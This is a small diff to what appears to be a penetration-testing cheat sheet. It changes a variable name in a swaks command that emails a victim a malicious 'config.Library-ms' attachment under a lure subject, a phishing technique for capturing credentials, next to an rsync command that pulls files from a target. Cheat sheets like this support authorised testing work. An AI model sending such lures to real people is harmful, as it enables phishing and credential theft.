@@ -20,5 +20,5 @@ rsync $TARGET_IP::$DIR/$FILE $FILE
 
 Send email using SMTP server and swaks:
 ```bash
-swaks -t $VICTIM@$DOMAIN --from $USER@$DOMAIN -ap --attach config.Library-ms --server $SMTP_SERVER --body body.txt --header "Subject: Interesting" --suppress-data
+swaks -t $VICTIM@$TARGET_AD --from $USER@$TARGET_AD -ap --attach config.Library-ms --server $SMTP_SERVER --body body.txt --header "Subject: Interesting" --suppress-data
 ```
